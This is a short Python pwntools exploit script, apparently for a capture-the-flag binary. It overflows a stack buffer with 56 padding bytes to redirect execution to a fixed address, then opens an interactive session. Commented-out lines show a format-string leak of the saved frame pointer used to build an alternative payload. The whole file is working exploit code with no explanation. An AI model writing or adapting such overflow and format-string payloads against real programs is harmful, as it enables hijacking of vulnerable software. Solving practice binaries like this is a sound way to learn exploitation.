from pwn import *

binary_name = "binary"
context.binary = binary = ELF('./binary', checksec=False)

p = process('./binary')
newaddress = p64(0x00401360)
print(str(p.recvuntil(b":\n")))

#p.sendline(b"%12$lx")
#rbp = p.recvuntil(b"Again:")
#rbp = str(rbp).split(" is ")[0].strip()
#print("\n\nrbp: ", rbp[4:],"\n\n")
#payload = b'A'*48 + p64(int(rbp[4:], 16)) + newaddress



p.sendline(b"Anything")
p.recvuntil(b"Again:")
payload = b'A'*56 + newaddress
p.sendline(payload)
p.interactive()
